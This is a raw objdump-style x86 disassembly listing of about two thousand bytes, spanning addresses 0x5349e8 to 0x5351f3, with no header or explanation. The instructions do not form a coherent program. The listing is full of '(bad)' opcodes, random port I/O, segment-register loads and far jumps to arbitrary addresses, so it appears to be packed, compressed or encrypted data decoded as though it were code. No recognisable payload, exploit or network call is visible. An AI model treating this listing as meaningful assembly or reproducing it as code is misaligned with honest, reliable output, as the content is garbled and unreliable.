  5349e8:	add    eax,0xcf9b38e
  5349ed:	push   ss
  5349ee:	loopne 0x534a67
  5349f0:	cwde   
  5349f1:	in     eax,0xdb
  5349f3:	cmp    DWORD PTR [ebx],edx
  5349f5:	stos   BYTE PTR es:[edi],al
  5349f6:	pop    ds
  5349f7:	pop    ss
  5349f8:	fmul   QWORD PTR [ebp-0x6b408460]
  5349fe:	xchg   ebp,eax
  5349ff:	das    
  534a00:	test   DWORD PTR [ebx],edi
  534a02:	data16 mov ss,WORD PTR [ecx+0x2ec28b58]
  534a09:	sub    eax,0x12d52149
  534a0e:	xor    eax,0x9aa01bf4
  534a13:	popf   
  534a14:	enter  0x54bc,0x88
  534a18:	cmp    al,0xeb
  534a1a:	(bad)  
  534a1b:	jl     0x5349f7
  534a1d:	and    al,bl
  534a1f:	lock ja 0x534a7b
  534a22:	mov    ds:0xa4f22518,eax
  534a27:	fadd   DWORD PTR [eax-0x6256aa5d]
  534a2d:	loop   0x534a34
  534a2f:	xor    al,0xc8
  534a31:	push   cs
  534a32:	push   esi
  534a34:	sbb    DWORD PTR [ecx-0x18],edi
  534a37:	shl    BYTE PTR [esi],cl
  534a39:	jae    0x534a0c
  534a3b:	in     eax,dx
  534a3c:	cmp    eax,0x24776f01
  534a41:	sbb    BYTE PTR [ebx+0xb81b0d2],dl
  534a47:	test   DWORD PTR ds:0x8351d5b,edi
  534a4d:	outs   dx,BYTE PTR ds:[esi]
  534a4e:	test   DWORD PTR [ebp+0x53043fd4],ecx
  534a54:	cmp    eax,0xbd14de1
  534a59:	leavew 
  534a5b:	mov    ds:0x23c13a1d,al
  534a60:	xchg   esp,eax
  534a61:	push   edi
  534a62:	lea    esp,[edx-0x24]
  534a65:	mov    cl,0xcc
  534a67:	mov    dh,0x6d
  534a69:	or     al,0x2d
  534a6b:	sbb    eax,0xb1887be2
  534a70:	pop    ds
  534a71:	add    al,0x4e
  534a73:	test   esp,eax
  534a75:	loope  0x534aa4
  534a77:	push   0xfffffff3
  534a79:	out    0xef,eax
  534a7b:	pop    ss
  534a7c:	mov    ch,0xfd
  534a7e:	sti    
  534a7f:	dec    esp
  534a80:	xchg   ecx,eax
  534a81:	sub    al,0x57
  534a83:	icebp  
  534a84:	aas    
  534a85:	add    DWORD PTR [eax+ebp*4],0x6
  534a89:	sbb    eax,0x67a233ce
  534a8e:	push   ds
  534a8f:	fstp   QWORD PTR [edx-0x4fe7f94f]
  534a95:	cmp    cl,ch
  534a97:	cmp    bl,BYTE PTR [ecx]
  534a99:	out    0xa4,al
  534a9b:	rcr    DWORD PTR [ebp+0x13],0x57
  534a9f:	in     eax,dx
  534aa0:	vprotq xmm1,xmm6,[edi]
  534aa5:	fcomi  st,st(2)
  534aa7:	jl     0x534ab1
  534aa9:	jo     0x534a86
  534aab:	retf   
  534aac:	cdq    
  534aad:	and    DWORD PTR [esi+0x5d],ecx
  534ab0:	mov    eax,DWORD PTR [edx-0x80]
  534ab3:	mov    ah,0x30
  534ab5:	mov    eax,ds:0xd8ce312d
  534aba:	enter  0x1af5,0x5
  534abe:	imul   esp,DWORD PTR [edi-0xcb41ba8],0xffffffb7
  534ac5:	loop   0x534ace
  534ac7:	pop    esi
  534ac8:	mov    ebx,0x23997227
  534acd:	jb     0x534a78
  534acf:	out    dx,al
  534ad0:	stc    
  534ad1:	dec    edi
  534ad2:	or     eax,DWORD PTR [edi]
  534ad4:	mov    dh,0x5b
  534ad6:	clc    
  534ad7:	add    DWORD PTR [ebp+0x2e834c63],ebx
  534add:	push   esp
  534ade:	lods   eax,DWORD PTR ds:[esi]
  534ae0:	fdivr  DWORD PTR [eax]
  534ae2:	out    0x8b,eax
  534ae4:	adc    al,0xf6
  534ae6:	shr    dl,1
  534ae8:	inc    eax
  534ae9:	inc    ecx
  534aea:	enter  0x18aa,0x48
  534aee:	pop    ebx
  534aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  534af0:	cld    
  534af1:	push   0x1c
  534af3:	add    bh,BYTE PTR [esi+eiz*8+0x7af08c26]
  534afa:	lods   eax,DWORD PTR ds:[esi]
  534afb:	sbb    dl,BYTE PTR [edx+edx*4]
  534afe:	call   FWORD PTR [ebx]
  534b00:	in     al,0x45
  534b02:	jle    0x534b11
  534b04:	repnz fwait
  534b06:	pop    edi
  534b07:	mov    ecx,0xa174dfce
  534b0c:	bound  esi,QWORD PTR [edx]
  534b0e:	fs mov edx,0x7f917377
  534b14:	mov    ah,0x82
  534b16:	js     0x534acd
  534b18:	call   0x702b4d3
  534b1d:	mov    bh,0x3d
  534b1f:	(bad)  
  534b20:	xor    edi,DWORD PTR [esi]
  534b22:	mov    dl,0xb7
  534b24:	and    BYTE PTR [ecx-0x29],ch
  534b27:	sub    DWORD PTR [eax],eax
  534b29:	popf   
  534b2a:	pusha  
  534b2b:	and    dl,BYTE PTR [esi]
  534b2d:	das    
  534b2e:	sbb    DWORD PTR [eax+0x4e8dc623],esp
  534b34:	nop
  534b35:	jge    0x534b5d
  534b37:	nop
  534b38:	cmp    edx,DWORD PTR [ebx+0x59d94225]
  534b3e:	and    ebx,DWORD PTR [eax+0x335c87ff]
  534b44:	fcmovnbe st,st(5)
  534b46:	popa   
  534b47:	add    DWORD PTR [edx-0x584989f0],edx
  534b4d:	adc    edi,ebx
  534b4f:	rcr    DWORD PTR [esi],0x19
  534b52:	fmul   st,st(6)
  534b54:	out    dx,al
  534b55:	adc    BYTE PTR [edx+ebp*1-0x2b51faba],0xc4
  534b5d:	dec    edx
  534b5e:	or     esi,DWORD PTR [ebp+0x3c]
  534b61:	std    
  534b62:	xor    edx,DWORD PTR [esi-0x29d39c45]
  534b68:	call   0x3f12:0x969c028e
  534b6f:	mov    esp,0xdb6c37bb
  534b74:	add    ch,0x61
  534b77:	jmp    0xf71392ef
  534b7c:	mov    ah,0xbc
  534b7e:	xor    esi,esp
  534b80:	cwde   
  534b81:	xlat   BYTE PTR ds:[ebx]
  534b82:	cmp    BYTE PTR [edx],0x74
  534b85:	repz and al,0x82
  534b88:	push   es
  534b89:	repnz test eax,0x9876582a
  534b8f:	dec    edx
  534b90:	push   ecx
  534b91:	push   eax
  534b92:	or     ecx,DWORD PTR [edx+0x597ccf49]
  534b98:	inc    esi
  534b99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  534b9a:	(bad)  
  534b9b:	mov    ah,0xca
  534b9d:	or     al,0x25
  534b9f:	icebp  
  534ba0:	mov    ah,0x65
  534ba2:	bnd jg 0x534bbb
  534ba5:	mov    eax,ds:0x20959073
  534baa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  534bab:	aam    0x19
  534bad:	aaa    
  534bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  534baf:	add    dh,dh
  534bb1:	pop    ecx
  534bb2:	push   0x76
  534bb4:	xchg   edx,eax
  534bb5:	ins    BYTE PTR es:[edi],dx
  534bb6:	add    edi,ebp
  534bb8:	out    0xa7,eax
  534bba:	push   ecx
  534bbb:	int    0xb7
  534bbd:	jle    0x534b97
  534bbf:	loop   0x534b78
  534bc1:	adc    ecx,DWORD PTR [edi]
  534bc3:	aaa    
  534bc4:	pop    ebx
  534bc5:	(bad)  
  534bc6:	dec    eax
  534bc7:	out    dx,al
  534bc8:	lods   eax,DWORD PTR ds:[esi]
  534bc9:	and    ebp,DWORD PTR [edi-0x47dd6e72]
  534bcf:	dec    edi
  534bd0:	popf   
  534bd1:	adc    al,al
  534bd3:	and    eax,0xb6122def
  534bd8:	xor    DWORD PTR [esi-0x5c434ad7],edx
  534bde:	or     dh,BYTE PTR [edx]
  534be0:	mov    ebx,0x874a5ea8
  534be5:	and    BYTE PTR [ebp-0x4f],ah
  534be8:	or     ebp,DWORD PTR [edi-0x256e06dc]
  534bee:	dec    eax
  534bef:	sahf   
  534bf0:	lea    ebx,[ebx]
  534bf2:	sub    ch,BYTE PTR [eax]
  534bf4:	out    dx,al
  534bf5:	out    0xe7,al
  534bf7:	test   BYTE PTR gs:[esi-0x49cab7f2],ah
  534bfe:	int    0x7d
  534c00:	(bad)  
  534c01:	stos   DWORD PTR es:[edi],eax
  534c02:	das    
  534c03:	jecxz  0x534b9b
  534c05:	fidiv  DWORD PTR [ecx-0x4c]
  534c08:	pop    ss
  534c09:	(bad)  
  534c0a:	loopne 0x534b93
  534c0c:	test   eax,0x168aa0ff
  534c11:	mov    esi,0xcf8d68d
  534c16:	adc    ebp,DWORD PTR [edx+0x72c4a053]
  534c1c:	jl     0x534bfe
  534c1e:	repz sbb BYTE PTR [eax],cl
  534c21:	idiv   DWORD PTR [edi]
  534c23:	mov    esi,0x37ab6af
  534c28:	sub    DWORD PTR [edi+0x4b209132],ecx
  534c2e:	imul   eax,DWORD PTR [ebx],0x7c
  534c31:	push   0x4b
  534c33:	pop    esp
  534c34:	sub    dh,ch
  534c36:	in     al,0x8d
  534c38:	fisub  DWORD PTR [ebx-0x31]
  534c3b:	inc    eax
  534c3c:	mov    gs:0xf6783f08,al
  534c42:	pop    edx
  534c43:	cld    
  534c44:	shl    DWORD PTR [eax-0x2889d35d],cl
  534c4a:	les    ecx,FWORD PTR [ecx-0x6e]
  534c4d:	and    ch,BYTE PTR [ebx+edi*1]
  534c50:	mov    edx,0x35b051a8
  534c55:	leave  
  534c56:	fnstcw WORD PTR [edi-0x1f031925]
  534c5c:	out    0xc6,al
  534c5e:	push   eax
  534c5f:	sub    BYTE PTR [edi+edx*1-0xd],0xa5
  534c64:	dec    ebx
  534c65:	rol    DWORD PTR [eax+ebx*4+0x2d],0x9c
  534c6a:	dec    edi
  534c6b:	in     eax,0x86
  534c6d:	mov    esp,DWORD PTR [eax-0x49edfffa]
  534c73:	bound  eax,QWORD PTR [ecx*4-0x169d18cd]
  534c7a:	fs dec esp
  534c7c:	inc    eax
  534c7d:	lods   eax,DWORD PTR ds:[esi]
  534c7e:	aad    0x46
  534c80:	arpl   WORD PTR [ecx-0x44],ax
  534c83:	xchg   ecx,eax
  534c84:	push   esi
  534c85:	outs   dx,DWORD PTR ds:[esi]
  534c86:	sbb    edx,0x1e
  534c89:	retf   0x6afb
  534c8c:	mov    es,WORD PTR [esi+0x5c]
  534c8f:	cwde   
  534c90:	adc    esp,DWORD PTR [esi]
  534c92:	lds    ebp,FWORD PTR [edx-0xa]
  534c95:	push   edx
  534c96:	and    DWORD PTR [edx],esp
  534c98:	in     eax,0x3d
  534c9a:	das    
  534c9b:	lock scas eax,DWORD PTR es:[edi]
  534c9d:	push   esp
  534c9e:	mov    esp,es
  534ca0:	cdq    
  534ca1:	inc    edx
  534ca2:	std    
  534ca3:	xor    DWORD PTR [eax],0x9e843f71
  534ca9:	fimul  WORD PTR [ebp+0x63]
  534cac:	test   eax,0xf9c0e35b
  534cb1:	aas    
  534cb2:	out    dx,eax
  534cb3:	ins    DWORD PTR es:[edi],dx
  534cb4:	cmp    eax,0x2042080a
  534cb9:	aaa    
  534cba:	das    
  534cbb:	adc    esp,edx
  534cbd:	aas    
  534cbe:	mov    ds:0x2fb6579c,eax
  534cc3:	pop    es
  534cc4:	fyl2x  
  534cc6:	sbb    eax,0xd44e8005
  534ccb:	xor    ch,dh
  534ccd:	fcmovnb st,st(3)
  534ccf:	jns    0x534c77
  534cd1:	imul   esp,DWORD PTR [ebx+0x2e],0x99c0b968
  534cd8:	xchg   ebx,eax
  534cd9:	cmp    edi,DWORD PTR [eax+0x0]
  534cdc:	inc    esp
  534cdd:	cmp    eax,DWORD PTR [eax-0x48]
  534ce0:	dec    ebx
  534ce1:	lds    ecx,FWORD PTR fs:[eax+0x57b69723]
  534ce8:	mov    bh,0xed
  534cea:	adc    BYTE PTR [eax-0x37],0x2a
  534cee:	pop    eax
  534cef:	or     al,0x81
  534cf1:	pop    ds
  534cf2:	push   esi
  534cf3:	mov    DWORD PTR [ebp-0x461adbb9],0x1e398c73
  534cfd:	xchg   BYTE PTR [esp+eiz*2+0x16],ch
  534d01:	sahf   
  534d02:	and    edi,eax
  534d04:	mov    al,0xdb
  534d06:	push   eax
  534d07:	pushf  
  534d08:	in     al,0xcf
  534d0a:	in     eax,dx
  534d0b:	in     al,dx
  534d0c:	ins    BYTE PTR es:[edi],dx
  534d0d:	pop    es
  534d0e:	fidivr WORD PTR [eax]
  534d10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  534d11:	cdq    
  534d12:	xchg   edi,eax
  534d13:	pop    edx
  534d14:	stos   DWORD PTR es:[edi],eax
  534d15:	ror    BYTE PTR [edx],0xd9
  534d18:	enter  0x8094,0xa1
  534d1c:	fst    DWORD PTR [ebx-0x1337824f]
  534d22:	push   0x86e6c0b5
  534d27:	in     eax,0xb6
  534d29:	sbb    al,0xa
  534d2b:	ins    DWORD PTR es:[edi],dx
  534d2c:	(bad)  
  534d2d:	pop    ebp
  534d2e:	sti    
  534d2f:	jbe    0x534da6
  534d31:	cdq    
  534d32:	or     al,0xbc
  534d34:	call   0xec815dd3
  534d39:	sbb    al,0x85
  534d3b:	xor    BYTE PTR [di],dh
  534d3e:	test   esp,edx
  534d40:	iret   
  534d41:	mov    dh,0x3d
  534d43:	xlat   BYTE PTR ds:[ebx]
  534d44:	xor    ch,BYTE PTR [ebx]
  534d46:	push   edi
  534d47:	jle    0x534ccd
  534d49:	rcr    BYTE PTR [eax],cl
  534d4b:	inc    edx
  534d4c:	test   DWORD PTR [esp+ebp*2-0x290a44d],ecx
  534d53:	fs test eax,0xe6f2a2e9
  534d5a:	icebp  
  534d5b:	mov    edi,0x33827423
  534d60:	xchg   esi,eax
  534d61:	jmp    0x3763:0xda84ff16
  534d68:	(bad)  
  534d69:	stos   DWORD PTR es:[edi],eax
  534d6a:	mov    edx,0xd24fc2da
  534d6f:	mov    WORD PTR [ecx],cs
  534d71:	mov    ds:0x2933b375,eax
  534d76:	xor    eax,0x2dca48b2
  534d7b:	(bad)  
  534d7c:	and    eax,0xdc952b8d
  534d81:	cwde   
  534d82:	mov    ecx,0xf9a849c0
  534d87:	imul   edx,DWORD PTR [edx],0xffffffbf
  534d8a:	(bad)  
  534d8b:	pusha  
  534d8c:	and    ebp,DWORD PTR [esi+0x5]
  534d8f:	inc    edi
  534d90:	sub    BYTE PTR [eax-0xdc5670c],bh
  534d96:	xor    esi,DWORD PTR [edx-0x36e4e542]
  534d9c:	leave  
  534d9d:	adc    BYTE PTR [edx],al
  534d9f:	fwait
  534da0:	mov    dh,al
  534da2:	inc    eax
  534da3:	mov    ds:0xf957e677,eax
  534da8:	popa   
  534da9:	dec    ebp
  534daa:	loope  0x534d5b
  534dac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  534dad:	add    al,0x66
  534daf:	jae    0x534e0d
  534db1:	imul   ebp,DWORD PTR [edi+ecx*8],0x4c
  534db5:	jecxz  0x534dbe
  534db7:	mov    ds:0x96e1d70f,eax
  534dbc:	cmp    dl,ch
  534dbe:	xor    ebp,esp
  534dc0:	retf   0xd3ea
  534dc3:	scas   eax,DWORD PTR es:[edi]
  534dc4:	push   ecx
  534dc5:	mov    bl,0x47
  534dc7:	mov    ds:0x4f193e36,eax
  534dcc:	loop   0x534ddd
  534dce:	(bad)  
  534dcf:	mov    al,ds:0xabbe951b
  534dd4:	nop
  534dd5:	pushf  
  534dd6:	or     eax,0x1faf393a
  534ddb:	mov    DWORD PTR [edi+0x46],0x38a86a1f
  534de2:	repz inc edi
  534de4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  534de5:	dec    edi
  534de6:	push   ebx
  534de7:	mov    esi,0x6be471c5
  534dec:	pop    ebp
  534ded:	fdecstp 
  534def:	pop    edx
  534df0:	mov    eax,ds:0xda7f844c
  534df5:	mov    ebx,0x57d7a7f
  534dfa:	frstor [eax+0x5f]
  534dfd:	pop    ds
  534dfe:	pushf  
  534dff:	dec    edx
  534e00:	sub    ebp,DWORD PTR [edx+0x4a0fb0d6]
  534e06:	inc    edx
  534e07:	sbb    eax,0xdf4d1471
  534e0c:	xor    eax,0x71fd37ab
  534e11:	jl     0x534e30
  534e13:	mov    ch,0xb
  534e15:	add    eax,0x38556ff8
  534e1a:	pushf  
  534e1b:	mov    fs,WORD PTR [edx-0x4223bd2]
  534e21:	mov    eax,0xfed969d
  534e26:	push   ebx
  534e27:	inc    DWORD PTR [ebx]
  534e29:	adc    ecx,0x5352df82
  534e2f:	jle    0x534e90
  534e31:	test   BYTE PTR [edi],cl
  534e33:	pusha  
  534e34:	std    
  534e35:	cmp    BYTE PTR [edx-0x7e0b92fd],bl
  534e3b:	in     al,0xe9
  534e3d:	into   
  534e3e:	mov    eax,0xab5a5c3e
  534e43:	das    
  534e44:	push   ds
  534e45:	adc    esi,DWORD PTR [edx-0x39]
  534e48:	inc    eax
  534e49:	sbb    BYTE PTR [eax+0x2064664b],bh
  534e4f:	sub    BYTE PTR [edx+0x58],al
  534e52:	icebp  
  534e53:	push   edi
  534e54:	(bad)  
  534e55:	cmp    BYTE PTR [ebp+ebx*4-0x1c],ah
  534e59:	adc    bh,BYTE PTR [ecx+ecx*8]
  534e5c:	add    eax,edx
  534e5e:	int    0xb
  534e60:	xchg   edi,eax
  534e61:	or     DWORD PTR [edi],ebx
  534e63:	mov    ebp,0x212a664b
  534e68:	fimul  DWORD PTR [edx-0xae22b51]
  534e6e:	sbb    eax,eax
  534e70:	in     al,dx
  534e71:	or     dl,dl
  534e73:	sbb    eax,ebx
  534e75:	cmp    cl,cl
  534e77:	or     eax,0x3dae83d9
  534e7c:	mov    BYTE PTR [edx+0x38d47a6],0xf3
  534e83:	mov    bh,0xf4
  534e85:	add    eax,0xe164007
  534e8a:	popf   
  534e8b:	mov    dl,0xcb
  534e8d:	in     al,dx
  534e8e:	retf   0x89e4
  534e91:	mov    ?,WORD PTR [esi-0x3e]
  534e94:	or     eax,0xa3ada2a0
  534e99:	pushf  
  534e9a:	jl     0x534f18
  534e9c:	(bad)  
  534e9d:	stc    
  534e9e:	jo     0x534e85
  534ea0:	aas    
  534ea1:	ss shr bh,0x5d
  534ea5:	xchg   esi,eax
  534ea6:	mov    edi,0xe7f9aca0
  534eab:	sti    
  534eac:	jns    0x534efd
  534eae:	jns    0x534ece
  534eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  534eb1:	call   0x4ebb05d6
  534eb6:	or     ch,BYTE PTR [eax-0x68]
  534eb9:	adc    BYTE PTR [edx+ebx*1-0x566c8905],al
  534ec0:	jmp    0xb8c0055
  534ec5:	cwde   
  534ec6:	mov    eax,ds:0x5c90630d
  534ecb:	shr    BYTE PTR [eax-0x71],cl
  534ece:	or     al,0xf8
  534ed0:	mov    cl,0xa5
  534ed2:	sbb    eax,DWORD PTR [eax]
  534ed4:	call   0x5684274c
  534ed9:	xchg   edi,eax
  534eda:	clc    
  534edb:	and    DWORD PTR [edi+0x6708cfb4],eax
  534ee1:	rcr    BYTE PTR [esp+edx*4-0x33],1
  534ee5:	outs   dx,DWORD PTR ds:[esi]
  534ee6:	ret    0xe0de
  534ee9:	sbb    eax,0xec444d30
  534eee:	dec    edi
  534eef:	pop    ecx
  534ef0:	call   0xd62:0x19c5d99f
  534ef7:	push   ebx
  534ef8:	dec    ebp
  534ef9:	rcr    BYTE PTR [eax+0x58],1
  534efc:	mov    cl,0x48
  534efe:	jo     0x534f31
  534f00:	fs pushf 
  534f02:	stos   DWORD PTR es:[edi],eax
  534f03:	jb     0x534ef0
  534f05:	pop    ss
  534f06:	mov    ebp,gs
  534f08:	mov    esp,0x63da8c97
  534f0d:	daa    
  534f0e:	out    dx,al
  534f0f:	xor    BYTE PTR [esp+ebx*1],ah
  534f12:	loop   0x534ec9
  534f14:	adc    DWORD PTR ds:0x68035ce0,esp
  534f1a:	jmp    0xe146:0x74e4a51a
  534f21:	aad    0x8f
  534f23:	test   DWORD PTR [ecx+edx*4],ecx
  534f26:	repz pop ss
  534f28:	push   0x11a98ba7
  534f2d:	cwde   
  534f2e:	jb     0x534f08
  534f30:	iret   
  534f31:	jb     0x534ecf
  534f33:	fcomp  DWORD PTR [edx]
  534f35:	mov    ss:0x82605d0f,al
  534f3b:	or     DWORD PTR [eax-0x7fab7759],0x37bdc2c3
  534f45:	pop    ecx
  534f46:	mov    DWORD PTR [ebp+eax*2-0x24],esi
  534f4a:	in     eax,dx
  534f4b:	push   esi
  534f4c:	add    BYTE PTR [edx-0xc],bh
  534f4f:	adc    al,bl
  534f51:	retf   0xe3b8
  534f54:	repz mov bl,BYTE PTR [ebp+0x3d]
  534f58:	stos   DWORD PTR es:[edi],eax
  534f59:	mov    ebx,0xfca94a05
  534f5e:	sbb    al,BYTE PTR ds:[eax+0x277ba460]
  534f65:	and    eax,0x3240f159
  534f6a:	js     0x534f68
  534f6c:	in     al,0x8c
  534f6e:	pop    ss
  534f6f:	in     al,dx
  534f70:	cmp    DWORD PTR [esi-0x7b0c5299],ecx
  534f76:	mov    al,ds:0x2cefa277
  534f7b:	push   ss
  534f7c:	imul   edx,DWORD PTR [edx+0x5e4f0d19]
  534f83:	daa    
  534f84:	addr16 loopne 0x534f4a
  534f87:	lea    edi,[edi]
  534f89:	or     ah,ch
  534f8b:	(bad)  
  534f8c:	in     eax,dx
  534f8d:	xchg   edx,eax
  534f8e:	cmp    cl,BYTE PTR [eax+0x12]
  534f91:	nop
  534f92:	(bad)  
  534f94:	push   edi
  534f95:	jbe    0x534f95
  534f97:	pop    edi
  534f98:	cmp    eax,0x60d1ebb7
  534f9d:	mov    cl,BYTE PTR [edx+ebx*2]
  534fa0:	ret    0xb78d
  534fa3:	cs or  eax,0x5b42d0df
  534fa9:	fiadd  DWORD PTR [edx+0xc]
  534fac:	inc    esi
  534fad:	cmp    eax,0xfcb3184
  534fb2:	cld    
  534fb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  534fb4:	(bad)  
  534fb5:	sbb    eax,0x7af0d923
  534fba:	push   es
  534fbb:	dec    esp
  534fbc:	fistp  DWORD PTR [edx]
  534fbe:	xor    dh,BYTE PTR [edx-0x70dafc68]
  534fc4:	mov    bl,0xe5
  534fc6:	and    esp,edi
  534fc8:	jae    0x53503c
  534fca:	das    
  534fcb:	clc    
  534fcc:	mov    ds:0x10e167e0,al
  534fd1:	jle    0x535004
  534fd3:	xchg   edi,eax
  534fd4:	jb     0x534f7d
  534fd6:	outs   dx,BYTE PTR ds:[esi]
  534fd7:	dec    ecx
  534fd8:	(bad)  
  534fd9:	jne    0x535025
  534fdb:	mov    bl,0x58
  534fdd:	mov    ebx,0x870d9567
  534fe2:	push   ebx
  534fe3:	mov    ecx,0x150fe493
  534fe8:	mov    ecx,0xb8f08e9c
  534fed:	adc    eax,0x4c8a2a74
  534ff2:	pop    edx
  534ff3:	sbb    eax,0x83eedb9f
  534ff8:	fisub  WORD PTR [edi+0x4708f369]
  534ffe:	or     BYTE PTR [ebx-0x4d5102a9],ah
  535004:	jg     0x535054
  535006:	mov    edi,0xf5c28452
  53500b:	mov    ds:0xff7ad9b8,eax
  535010:	aas    
  535011:	mov    BYTE PTR [ebp+ebx*8-0x1fb61017],al
  535018:	mov    al,ds:0x23abed49
  53501d:	jg     0x53508e
  53501f:	pop    ebp
  535020:	and    ebx,DWORD PTR [ecx-0x4f455907]
  535026:	out    0xa6,eax
  535028:	or     al,0xc9
  53502a:	lods   eax,DWORD PTR ds:[esi]
  53502b:	dec    eax
  53502c:	adc    ebp,DWORD PTR [eax-0xc]
  53502f:	mov    WORD PTR [ebp+ebp*4+0x58],?
  535033:	stos   BYTE PTR es:[edi],al
  535034:	ja     0x534fca
  535036:	or     eax,DWORD PTR [ebx-0x65]
  535039:	and    BYTE PTR [ecx],bl
  53503b:	mov    ch,0x1f
  53503d:	jp     0x534fde
  53503f:	xor    al,BYTE PTR [edx+0x5d]
  535042:	ss in  eax,0xb3
  535045:	fdiv   QWORD PTR es:[ecx+0x53b7300e]
  53504c:	push   ss
  53504d:	xchg   ecx,eax
  53504e:	fwait
  53504f:	out    dx,al
  535050:	add    eax,0xe7feaa9d
  535055:	xchg   DWORD PTR [ecx],edx
  535057:	push   ebp
  535058:	je     0x5350c2
  53505a:	inc    edx
  53505b:	callw  0x87a6
  53505f:	(bad)  
  535061:	adc    ch,dh
  535063:	leave  
  535064:	les    esi,FWORD PTR [ebp+0x1f]
  535067:	clc    
  535068:	shr    DWORD PTR [ecx+0xf],cl
  53506b:	out    0x74,eax
  53506d:	sbb    dh,BYTE PTR [ecx+0x7ea95d92]
  535073:	xchg   ebp,eax
  535074:	mov    dh,0x2f
  535076:	xor    eax,0x4ab702cc
  53507b:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  53507d:	imul   DWORD PTR [eax-0x3b]
  535080:	ror    DWORD PTR [ecx],1
  535082:	mov    cl,0x5b
  535084:	neg    ecx
  535086:	mov    ecx,0xbef9bab6
  53508b:	inc    esp
  53508c:	shr    BYTE PTR [edx+0x360fa5a1],0x3
  535093:	or     DWORD PTR [ecx+ebx*8+0x5ea11c80],0xb0e077fd
  53509e:	sub    cl,bh
  5350a0:	out    0x1a,al
  5350a2:	mov    dl,0xe0
  5350a4:	int3   
  5350a5:	ja     0x535043
  5350a7:	mov    ds:0x7633e64c,eax
  5350ac:	je     0x535037
  5350ae:	mov    edi,ebp
  5350b0:	xchg   edi,eax
  5350b1:	dec    edx
  5350b2:	lock pop ecx
  5350b4:	and    DWORD PTR [edx+eiz*2],ebp
  5350b7:	test   eax,0x68864f75
  5350bc:	add    al,0xcc
  5350be:	dec    esp
  5350bf:	sbb    dh,BYTE PTR [esi]
  5350c1:	jbe    0x535090
  5350c3:	sbb    BYTE PTR [eax+0x47329554],0x10
  5350ca:	mov    eax,ds:0x3e8ef095
  5350cf:	data16 jecxz 0x53509a
  5350d2:	and    BYTE PTR [edi+0x3a],ah
  5350d5:	out    dx,eax
  5350d6:	mov    DWORD PTR [ecx],edi
  5350d8:	add    al,0x19
  5350da:	or     DWORD PTR [edi],ebx
  5350dc:	(bad)
  5350e0:	mov    esi,0x773582b3
  5350e5:	dec    esi
  5350e6:	mov    ecx,0x8880bee4
  5350eb:	jo     0x535134
  5350ed:	stos   DWORD PTR es:[edi],eax
  5350ee:	cmp    DWORD PTR [ebx+0x3a64b565],eax
  5350f4:	and    DWORD PTR [ebp-0x5a],ebx
  5350f7:	mov    ecx,0x98b2a8b5
  5350fc:	xor    eax,0x594254a0
  535101:	push   0x6603bcb
  535106:	jb     0x535111
  535108:	daa    
  535109:	xlat   BYTE PTR ds:[ebx]
  53510a:	test   eax,0xcfdf8b4a
  53510f:	fsubr  st(3),st
  535111:	adc    eax,esp
  535113:	pop    ebx
  535114:	lahf   
  535115:	mul    dh
  535117:	cmp    eax,0x4f9cbe89
  53511c:	std    
  53511d:	cmc    
  53511e:	loopne 0x53518a
  535120:	inc    ebp
  535121:	ret    
  535122:	cmp    ch,BYTE PTR [ecx+0x6df58d2b]
  535128:	dec    ecx
  535129:	(bad)  
  53512a:	dec    ebp
  53512b:	mov    DWORD PTR [ebx+0x7e9479c3],0x9a746135
  535135:	mov    ebp,0x50df3f9d
  53513a:	imul   edx,DWORD PTR ds:0xae24c712,0x385e81ab
  535144:	das    
  535145:	cwde   
  535146:	pop    ecx
  535147:	add    DWORD PTR [ecx],0x5a
  53514a:	clc    
  53514b:	rol    DWORD PTR [esp+eax*2-0x51],1
  53514f:	(bad)  
  535150:	scas   al,BYTE PTR es:[edi]
  535151:	aas    
  535152:	sar    DWORD PTR [eax+ecx*1-0x38fca5e8],1
  535159:	icebp  
  53515a:	add    eax,0x38b35f52
  53515f:	xchg   DWORD PTR [edi+0x5a],ecx
  535162:	aam    0xaf
  535164:	inc    ebx
  535165:	push   0xf880dd8
  53516a:	adc    esp,DWORD PTR [ecx+edx*4]
  53516d:	and    BYTE PTR [edi-0x61d7b7be],0x49
  535174:	shl    DWORD PTR [eax+0x36695a2f],1
  53517a:	add    eax,DWORD PTR [edi]
  53517c:	mov    DWORD PTR [edx+0x12],ebx
  53517f:	stos   DWORD PTR es:[edi],eax
  535180:	repnz push edi
  535182:	into   
  535183:	jge    0x535159
  535185:	fild   QWORD PTR [ebx-0x4f]
  535188:	add    eax,0xb99e7297
  53518d:	out    dx,al
  53518e:	retf   
  53518f:	sub    ebx,ebp
  535191:	subps  xmm6,xmm0
  535194:	loop   0x53520d
  535196:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  535197:	mov    edx,0xd4480d2c
  53519c:	and    eax,0xafcfb1c7
  5351a1:	cmc    
  5351a2:	or     DWORD PTR [ecx+esi*1+0x455f5c5],edi
  5351a9:	xchg   edx,eax
  5351aa:	jl     0x53520d
  5351ac:	popf   
  5351ad:	dec    edx
  5351ae:	jns    0x535176
  5351b0:	or     al,0x3
  5351b2:	push   eax
  5351b3:	adc    cl,BYTE PTR ds:0x66e9ce63
  5351b9:	clc    
  5351ba:	jmp    0x31014d81
  5351bf:	and    al,0x9b
  5351c1:	jnp    0x53517f
  5351c3:	push   ebp
  5351c4:	ins    DWORD PTR es:[edi],dx
  5351c5:	and    DWORD PTR [edi+0x6e8890ce],ebx
  5351cb:	aam    0xf2
  5351cd:	push   ebx
  5351ce:	test   eax,0x28fbe302
  5351d3:	das    
  5351d4:	jecxz  0x535211
  5351d6:	inc    ebx
  5351d7:	mov    ch,0xef
  5351d9:	pushf  
  5351da:	jne    0x5351b1
  5351dc:	imul   esp,DWORD PTR [esi+0x1],0xdf71aad7
  5351e3:	sub    BYTE PTR [ebp-0xa],cl
  5351e6:	mov    WORD PTR [edx+0x1],gs
  5351e9:	out    0x6e,al
  5351eb:	shl    BYTE PTR ds:0xd3b6765b,cl
  5351f1:	mov    ch,0xb3
  5351f3:	dec    ebx
